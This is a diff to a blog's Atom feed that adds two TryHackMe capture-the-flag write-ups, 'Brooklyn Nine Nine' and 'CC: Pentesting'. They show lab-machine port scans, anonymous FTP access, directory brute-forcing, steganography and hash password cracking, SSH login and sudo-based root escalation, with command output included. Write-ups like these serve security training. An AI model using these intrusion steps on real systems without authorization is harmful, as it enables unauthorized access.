@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="https://darrynbrownfield.co.uk/tag/easy/feed.xml" rel="self" type="application/atom+xml" />
   <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
-  <updated>2020-12-05T14:36:28+00:00</updated>
+  <updated>2021-01-02T13:02:01+00:00</updated>
   <id>https://darrynbrownfield.co.uk/tag/easy/feed.xml</id>
 
   
@@ -30,6 +30,388 @@
   
   
 
+  
+    <entry>
+      <title type="html">Brooklyn Nine Nine Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/brooklynninenine" rel="alternate" type="text/html" title="Brooklyn Nine Nine Write Up" />
+      <published>2021-01-01T00:00:00+00:00</published>
+      <updated>2021-01-01T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/brooklynninenine</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/brooklynninenine">&lt;p&gt;&lt;img src=&quot;/assets/images/brooklynninenine/cover.png&quot; alt=&quot;brooklynninenine&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/brooklynninenine&quot;&gt;Brooklyn Nine Nine&lt;/a&gt; is a easy room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; by Fsociety2006.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;I deployed the machine and was given the target IP 10.10.130.161. I started a NMAP scan to check the available ports.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oN initial 10.10.130.161
+[sudo] password for daz: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-01 14:26 GMT
+Nmap scan report for 10.10.130.161
+Host is up (0.070s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
+|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
+|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;3 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;21 - FTP - Anonymous log in allowed with a note&lt;/li&gt;
+  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache web server version 2.4.29&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;As the FTP service allows anonymous access I started by logging in with the username ‘anonymous’ and the password ‘anonymous’.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ftp 10.10.130.161
+Connected to 10.10.130.161.
+220 (vsFTPd 3.0.3)
+Name (10.10.130.161:daz): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+226 Directory send OK.
+ftp&amp;gt; get note_to_jake.txt
+local: note_to_jake.txt remote: note_to_jake.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
+226 Transfer complete.
+119 bytes received in 0.03 secs (4.3601 kB/s)
+ftp&amp;gt; ls -lah
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        114          4096 May 17  2020 .
+drwxr-xr-x    2 0        114          4096 May 17  2020 ..
+-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
+226 Directory send OK.
+ftp&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I downloaded the note_to_jake.txt file but couldn’t find anything else. The note reads:&lt;/p&gt;
+&lt;blockquote&gt;
+
+  &lt;p&gt;From Amy,&lt;/p&gt;
+
+  &lt;p&gt;Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine&lt;/p&gt;
+
+&lt;/blockquote&gt;
+
+&lt;p&gt;The note indicates a weak password being used, I moved on to port 80 and looked at the web page.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+&amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&amp;gt;
+&amp;lt;style&amp;gt;
+body, html {
+  height: 100%;
+  margin: 0;
+}
+
+.bg {
+  /* The image used */
+  background-image: url(&quot;brooklyn99.jpg&quot;);
+
+  /* Full height */
+  height: 100%; 
+
+  /* Center and scale the image nicely */
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+}
+&amp;lt;/style&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+
+&amp;lt;div class=&quot;bg&quot;&amp;gt;&amp;lt;/div&amp;gt;
+
+&amp;lt;p&amp;gt;This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.&amp;lt;/p&amp;gt;
+&amp;lt;!-- Have you ever heard of steganography? --&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The page just displays an image of Brooklyn nine nine, however looking at the source provides a comment regarding steganography.&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;I downloaded the image and ran steghide however the I cant extract the data with out a password. I used &lt;a href=&quot;https://github.com/RickdeJager/stegseek&quot;&gt;StegSeek&lt;/a&gt; and the rockyou.txt word list to crack the password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
+StegSeek version 0.5
+Progress: 0.00% (0 bytes)           
+
+[i] --&amp;gt; Found passphrase: &quot;&amp;lt;REDACTED&amp;gt;&quot;
+[i] Original filename: &quot;note.txt&quot;
+[i] Extracting to &quot;brooklyn99.jpg.out&quot;
+┌─[daz@parrot]─[~/Documents/TryHackMe/Brooklyn99]
+└──╼ $cat brooklyn99.jpg.out
+Holts Password:
+flu&amp;lt;REDACTED&amp;gt;
+
+Enjoy!!
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Great I now have some credentials. Using the credentials I can now SSH in to the machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh holt@10.10.130.161
+holt@10.10.130.161's password: 
+Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
+holt@brookly_nine_nine:~$ 
+holt@brookly_nine_nine:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;The privilege escalation was really simple, doing a sudo -l, all users can run /bin/nano without a password. Going to &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;GTFOBins&lt;/a&gt; shows the steps required to abuse this and get root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;holt@brookly_nine_nine:~$ sudo -l
+Matching Defaults entries for holt on brookly_nine_nine:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User holt may run the following commands on brookly_nine_nine:
+    (ALL) NOPASSWD: /bin/nano
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Following the steps, I get a root shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# id
+uid=0(root) gid=0(root) groups=0(root)
+# hostname
+brookly_nine_nine
+# cd /root
+# ls
+root.txt
+#
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="easy" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+    <entry>
+      <title type="html">CC: Pentesting Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/ccpentesting" rel="alternate" type="text/html" title="CC: Pentesting Write Up" />
+      <published>2020-12-08T00:00:00+00:00</published>
+      <updated>2020-12-08T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/ccpentesting</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/ccpentesting">&lt;p&gt;&lt;img src=&quot;/assets/images/ccpentesting/cover.png&quot; alt=&quot;CCPentesting&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/ccpentesting&quot;&gt;CC:Pen Testing&lt;/a&gt; is a guided room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; providing an introduction to some of the common penetration testing tools. Its really well layed out and I recommend to anyone starting out in penetration testing or CTF challenges. This write up will only cover the steps for the final exam.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;As normal, I kicked off a nmap scan to see what ports are available.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA initial 10.10.215.190
+[sudo] password for daz: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 21:42 GMT
+Nmap scan report for 10.10.215.190
+Host is up (0.027s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 12:96:a6:1e:81:73:ae:17:4c:e1:7c:63:78:3c:71:1c (RSA)
+|   256 6d:9c:f2:07:11:d2:aa:19:99:90:bb:ec:6b:a1:53:77 (ECDSA)
+|_  256 0e:a5:fa:ce:f2:ad:e6:fa:99:f3:92:5f:87:bb:ba:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;2 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache web server version 2.4.18&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;I also ran a full port scan but no additional ports were found.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;The web page displays the basic apache page, I checked the source code but everything was standard. I kicked off a gobuster to see what other directories were available.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.215.190 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.215.190
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/12/08 21:49:12 Starting gobuster
+===============================================================
+/secret (Status: 301)
+/server-status (Status: 403)
+===============================================================
+2020/12/08 21:51:09 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;One directory found ‘/secret’, going to secret doesn’t display anything. I ran a second gobuster but this time in the secret folder and checked for .log, .txt and .html using the -x flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://10.10.215.190/secret -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x log,txt,html
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.215.190/secret
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     log,txt,html
+[+] Timeout:        10s
+===============================================================
+2020/12/08 21:55:16 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/secret.txt (Status: 200)
+Progress: 49450 / 220561 (22.42%)^C
+[!] Keyboard interrupt detected, terminating.
+===============================================================
+2020/12/08 21:59:31 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;1 additional file found, secret.txt. Web browsing to http://10.10.215.190/secret/secret.txt I could see the contents of the file:&lt;/p&gt;
+
+&lt;p&gt;nyan:046385855FC9580393853D8E(REDACTED)&lt;/p&gt;
+
+&lt;p&gt;The password looks to be SHA1. I put the hash in to a file called hash.txt on my VM and ran hashcat with the command: hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt –force&lt;/p&gt;
+
+&lt;p&gt;Hashcat was successfully able to crack the hash and I was able to SSH in to the machine.&lt;/p&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;Once connected via SSH I ran ‘sudo -l’, the user nyan is able to run the command /bin/su as root without providing a password. This provides a simple privesc by using the command: ‘sudo su’&lt;/p&gt;
+
+&lt;p&gt;Other techniques like this can be found on &lt;a href=&quot;https://gtfobins.github.io&quot;&gt;gtfobins&lt;/a&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;nyan@ubuntu:~$ sudo -l
+Matching Defaults entries for nyan on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nyan may run the following commands on ubuntu:
+    (root) NOPASSWD: /bin/su
+nyan@ubuntu:~$
+nyan@ubuntu:~$ sudo su
+root@ubuntu:/home/nyan# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu:/home/nyan# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="easy" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
   
     <entry>
       <title type="html">Chill Hack Write Up</title>
